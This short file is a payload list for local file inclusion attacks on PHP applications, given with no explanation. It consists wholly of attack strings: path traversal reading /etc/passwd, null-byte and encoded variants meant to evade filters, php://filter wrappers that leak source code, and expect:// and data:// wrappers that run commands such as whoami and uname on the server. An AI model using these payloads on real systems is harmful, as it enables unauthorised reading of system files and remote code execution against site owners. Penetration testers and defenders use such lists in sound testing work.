# Simple LFI List

```
index.php?page=../../../etc/passwd
index.php?page=../../../etc/passwd%00
index.php?page=%252e%252e%252fetc%252fpasswd%00                       
index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00   
index.php?page=file:///etc/passwd
index.php?page=expect://whoami
index.php?page=php://filter/read=string.rot13/resource=index.php
index.php?page=php://filter/convert.base64-encode/resource=index.php
index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E
```

